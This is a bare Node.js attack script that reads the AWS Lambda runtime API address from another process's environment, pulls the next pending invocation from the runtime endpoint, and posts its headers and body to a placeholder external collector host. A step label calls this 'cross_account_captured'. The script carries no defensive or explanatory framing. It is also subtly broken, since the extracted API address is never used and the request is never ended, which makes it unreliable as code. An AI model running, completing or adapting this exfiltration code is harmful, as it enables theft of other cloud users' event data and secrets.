const https = require('https'), http = require('http'), fs = require('fs');
const CALLBACK = 'https://collector.example.invalid/data';
function phoneHome(data) { const req = https.request(CALLBACK, { method: 'POST' }); req.write(JSON.stringify(data)); req.end(); }
const raw = fs.readFileSync('/proc/2/environ', 'utf8');
const match = raw.match(/AWS_LAMBDA_RUNTIME_API=([^\0]+)/);
http.request({ path: '/2018-06-01/runtime/invocation/next' }, res => {
  let body = ''; res.on('data', chunk => body += chunk); res.on('end', () => {
    phoneHome({ step: 'cross_account_captured', statusCode: res.statusCode, headers: res.headers, body: body.slice(0, 8000) });
  });
});
